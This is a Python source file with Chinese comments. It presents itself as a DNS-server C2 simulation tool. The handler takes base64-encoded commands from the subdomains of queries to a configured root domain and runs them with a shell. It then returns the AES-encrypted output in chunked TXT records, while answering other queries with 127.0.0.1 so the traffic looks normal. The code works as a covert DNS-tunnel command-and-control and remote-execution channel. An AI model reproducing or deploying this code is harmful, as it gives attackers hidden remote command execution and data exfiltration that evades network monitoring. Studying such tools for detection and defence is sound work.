# server.py  （DNS 服务器 - C2模拟工具）

import socketserver  
import threading  
from dnslib import DNSRecord, DNSHeader, DNSQuestion, A, TXT, RR  
from dnslib import QTYPE
import base64  
import subprocess  
from crypto import AESCipher  
from config import ROOT_DOMAIN, AES_KEY  
import time  

class DNSHandler(socketserver.BaseRequestHandler):  
    def handle(self):  
        # 获取收到的数据和socket对象
        data = self.request[0].strip()  
        socket = self.request[1]  

        try:  
            # 解析DNS请求包
            request = DNSRecord.parse(data)  
            qname = str(request.q.qname)  # 查询的域名
            qtype = request.q.qtype       # 查询类型（如A、TXT等）
            qtype = int(qtype)            # 转为整数类型

            print(f"收到DNS查询: {qname} (类型: {qtype})")  

            # 构造DNS响应包头
            response = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)  

            # 判断是否为隧道流量（即目标域名是否为C2根域名）
            if ROOT_DOMAIN in qname:  
                # DNS隧道通信流量
                # 提取子域名部分（即Base64编码的命令）
                subdomains = qname.split('.')[:-len(ROOT_DOMAIN.split('.')) - 1]  
                if subdomains:  
                    encoded_command = "".join(subdomains)  
                    try:  
                        # Base64解码得到命令
                        command = base64.b64decode(encoded_command).decode('utf-8')  
                        print(f"解码后的命令: {command}")  

                        # 执行命令，获取结果
                        try:  
                            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)  
                        except subprocess.CalledProcessError as e:  
                            result = f"命令执行失败: {e}\n{e.stdout}"  

                        # 用AES加密命令执行结果
                        cipher = AESCipher(AES_KEY)  
                        encrypted_result = cipher.encrypt(result.encode('utf-8'))  

                        # 按DNS TXT记录长度限制分段加密结果
                        chunk_size = 180  # 每段最大180字节
                        chunks = [encrypted_result[i:i + chunk_size] for i in range(0, len(encrypted_result), chunk_size)]  

                        # 每段加密结果用Base64编码后放入TXT记录
                        for i, chunk in enumerate(chunks):
                            if not isinstance(chunk, bytes):
                                chunk = bytes(chunk, 'utf-8')
                            txt_data = base64.b64encode(chunk).decode('utf-8')
                            print(f"chunk type: {type(chunk)}, txt_data type: {type(txt_data)}, txt_data: {txt_data}")
                            response.add_answer(RR(str(qname), QTYPE.TXT, rclass=1, ttl=60, rdata=TXT(txt_data)))

                        print(f"已发送 {len(chunks)} 条TXT记录（加密结果）。")  

                    except (base64.binascii.Error, UnicodeDecodeError) as e:  
                        print(f"命令解码出错: {e}")  
                        response.add_answer(RR(qname, QTYPE.TXT, 60, TXT("命令解码出错")))  

                else:  
                    # 没有命令子域名，返回提示
                    response.add_answer(RR(qname, QTYPE.TXT, 60, TXT("子域名中无命令")))  

            else:  
                # 模拟正常DNS流量（如A记录查询）
                # 实际应用中可转发到真实DNS服务器，这里直接返回本地回环地址
                response.add_answer(RR(qname,  QTYPE.A, 60, A("127.0.0.1")))  
                print("模拟正常DNS响应。")  

            # 发送响应包给客户端
            socket.sendto(response.pack(), self.client_address)  

        except Exception as e:  
            print(f"处理DNS请求出错: {e}")  
            # 出错时返回最基础的DNS响应，避免客户端阻塞
            try:
                response = DNSRecord(DNSHeader(qr=1, aa=1, ra=1))
                socket.sendto(response.pack(), self.client_address)
            except Exception as e2:
                print(f"发送错误响应失败: {e2}")

# 多线程UDP服务器，支持并发处理多个DNS请求
class ThreadedUDPServer(socketserver.ThreadingMixIn, socketserver.UDPServer):  
    pass  

def run_server(host='0.0.0.0', port=53):  
    # 启动DNS服务器
    server = ThreadedUDPServer((host, port), DNSHandler)  
    server_thread = threading.Thread(target=server.serve_forever)  
    server_thread.daemon = True  
    server_thread.start()  
    print(f"DNS服务器监听于 {host}:{port} ...")  
    return server  

if __name__ == "__main__":  
    server = run_server()  
    try:  
        while True:  
            time.sleep(1)  
    except KeyboardInterrupt:  
        print("正在停止服务器...")  
        server.shutdown()
        